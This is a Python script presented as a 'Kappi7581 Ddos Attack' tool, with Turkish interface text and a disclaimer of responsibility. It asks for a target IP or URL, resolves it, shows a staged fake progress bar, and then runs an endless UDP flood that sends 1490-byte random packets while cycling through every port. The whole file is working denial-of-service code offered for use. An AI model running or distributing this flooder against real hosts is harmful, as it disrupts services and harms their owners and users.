import sys
import os
import time
import socket
import random
import requests
from datetime import datetime
from urllib.parse import urlparse

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Kappi7581 Ddos Attack")
print
print('"Developer: Kappi7581"')
print('"Version: v1.0"')
print('"Github: github.com/Kappi7581"')
print('"Kappi7581 Ddos v1.0 tamamen Kappi7581 e ait bir projedir, sorumluluk kabul etmiyoruz."')
print
ip_or_url = input("IP veya URL           : ")
port = input("Port (8080 yaz)       : ")
os.system("clear")
print("\033[93m")
os.system("figlet Kappi7581 Ddos Attack")
print("Developer : Kappi7581")
print("\033[92m")

parsed_url = urlparse(ip_or_url)
if parsed_url.scheme in ['http', 'https']:
    try:
        ip = socket.gethostbyname(parsed_url.hostname)
        print(f"URL {ip_or_url} adresinin IP'si: {ip}")
    except socket.gaierror:
        print("URL IP'ye çevrilemedi.")
        sys.exit()
else:
    ip = ip_or_url
    print(f"IP adresi: {ip}")

print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip, int(port)))
     sent = sent + 1
     port = int(port) + 1
     print("Sent %s packet to %s through port:%s Developer By Kappi7581"%(sent,ip,port))
     if port == 65534:
       port = 1